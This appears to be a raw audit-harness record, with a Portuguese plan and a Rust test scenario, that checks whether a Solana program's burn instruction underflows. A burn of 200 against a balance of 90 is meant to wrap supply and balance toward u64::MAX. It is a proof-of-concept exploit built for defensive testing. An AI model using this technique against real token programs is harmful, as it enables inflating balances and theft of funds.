attempts.raw:
{
  "plan": "Preparar uma conta ledger com supply=100 e balance=100 nos offsets 40 e 48, dona do programa. O baseline chama burn com amount=10, reduzindo supply e balance para 90. O ataque chama burn com amount=200, maior que o balance, e o wrapping_sub deve fazer os valores darem a volta para perto de u64::MAX. O efeito mede que o supply ou o balance resultante ficou maior que o valor inicial, indicando underflow silencioso.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let mut ledger_data = vec![0u8; 56];
ledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());
ledger_data[48..56].copy_from_slice(&100u64.to_le_bytes());
let ledger = account(&env.program_id, &ledger_data, None);

let metas = vec![AccountMeta::new(ledger_key, false)];
let contas = vec![(ledger_key, ledger.clone())];

let ix_legit = env.raw_ix(&[IX_BURN, 10u64.to_le_bytes().as_ref()].concat(), metas.clone());
let r_base = env.baseline("burn legitimo de 10", &ix_legit, &contas);

let contas_apos_base: Vec<(Pubkey, AccountSharedData)> = r_base.resulting_accounts.clone();

let ix_ataque = env.raw_ix(&[IX_BURN, 200u64.to_le_bytes().as_ref()].concat(), metas);
let r = env.attack("burn de 200 com saldo 90", &ix_ataque, &contas_apos_base);

if r.program_result == ProgramResult::Success {
    let supply = read_u64(after(&r, &ledger_key).data(), 40);
    let balance = read_u64(after(&r, &ledger_key).data(), 48);
    env.effect("supply deu a volta (underflow)", supply > 90);
    env.effect("balance deu a volta (underflow)", balance > 90);
}"
}

